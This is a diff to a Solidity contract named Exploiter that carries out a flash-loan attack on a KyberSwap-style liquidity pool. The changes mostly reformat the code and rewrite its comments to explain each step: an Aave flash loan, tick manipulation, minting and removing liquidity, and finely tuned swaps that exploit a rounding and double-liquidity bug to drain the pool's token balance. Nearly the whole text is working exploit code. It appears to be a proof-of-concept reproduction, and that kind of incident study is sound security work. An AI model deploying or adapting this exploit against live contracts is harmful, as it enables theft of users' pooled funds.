@@ -52,7 +52,7 @@ contract Exploiter {
         IAavePool(lender).flashLoanSimple(address(this), address(token1), flashloanAmount, "", 0);
     }
 
-    //flash loan core logic
+    // Flash loan core logic
     function _flashCallback(uint256 due) internal returns (bool) {
         int24 _currentTick;
         int24 _nearestCurrentTick;
@@ -60,17 +60,17 @@ contract Exploiter {
         uint160 _sqrtP;
         uint256 _tokenId;
 
-        //setting the swap fee
+        // Get swap fee for position minting
         _swapFee = victimPool.swapFeeUnits();
 
-        //giving required approval to mint the position
+        // Approve position manager to spend tokens
         token0.approve(address(positionManager), type(uint256).max);
         token1.approve(address(positionManager), type(uint256).max);
 
-        //step1: move the tick range with 0 liquidity
-        victimPool.swap(address(this), int256(flashloanAmount), false, 0x100000000000000000000000000, "");//limit price 20282409603651670423947251286016
+        // Step 1: Move tick range to position with zero liquidity
+        victimPool.swap(address(this), int256(flashloanAmount), false, 0x100000000000000000000000000, "");
 
-        //step2: mint/supply liquidity
+        // Step 2: Mint concentrated liquidity at current tick (111,310) with upper bound at same tick
         (_sqrtP, _currentTick, _nearestCurrentTick,) = victimPool.getPoolState();
         (_tokenId,,,) = positionManager.mint(
             IKyberswapPositionManager.MintParams({
@@ -86,11 +86,10 @@ contract Exploiter {
                 amount1Min: 0,
                 recipient: address(this),
                 deadline: block.timestamp
-
             })
         );
 
-        //step3: remove liquidity
+        // Step 3: Remove partial liquidity to set up pool state for precision manipulation
         positionManager.removeLiquidity(
             IKyberswapPositionManager.RemoveLiquidityParams({
                 tokenId: _tokenId,
@@ -101,24 +100,32 @@ contract Exploiter {
             })
         );
 
-        //step4/5: swap back and forth
+        // Step 4: Execute precisely calculated swap to exploit rounding error - creates impossible state
         victimPool.swap(
-            address(this), 387_170_294_533_119_999_999, false, 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341, ""
+            address(this),
+            387_170_294_533_119_999_999,
+            false,
+            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341,
+            ""
         );
 
-        victimPool.swap(
-            address(this), -int256(token1.balanceOf(address(victimPool))), false, 4_295_128_740, ""
-        );
+        // Step 5: Swap opposite direction exploiting double liquidity bug - uses inflated liquidity for favorable rates
+        victimPool.swap(address(this), -int256(token1.balanceOf(address(victimPool))), false, 4_295_128_740, "");
 
-        //repay the flash loan
+        // Step 6: Repay flash loan
         token1.approve(lender, due);
 
         return true;
-
     }
 
-    //swap callback
-    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata data) external {
+    // Swap callback - transfers tokens to pool during swap
+    function swapCallback(
+        int256 deltaQty0,
+        int256 deltaQty1,
+        bytes calldata /* data */
+    )
+        external
+    {
         if (deltaQty0 > 0) {
             token0.transfer(msg.sender, uint256(deltaQty0));
         } else if (deltaQty1 > 0) {
@@ -126,22 +133,32 @@ contract Exploiter {
         }
     }
 
-    //flash loan callback for aave
-     function executeOperation(
-        address asset,
+    // Flash loan callback for Aave
+    function executeOperation(
+        address,
+        /* asset */
         uint256 amount,
         uint256 premium,
-        address initiator,
-        bytes memory params
-    ) external returns (bool) {
+        address,
+        /* initiator */
+        bytes memory /* params */
+    )
+        external
+        returns (bool)
+    {
         return _flashCallback(amount + premium);
     }
 
-    //flash loan callback for uni
-    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
+    // Flash loan callback for Uniswap V3 (unused in this exploit)
+    function uniswapV3FlashCallback(
+        uint256,
+        /* fee0 */
+        uint256 fee1,
+        bytes calldata /* data */
+    )
+        external
+    {
         _flashCallback(fee1);
     }
-
-
 }
 
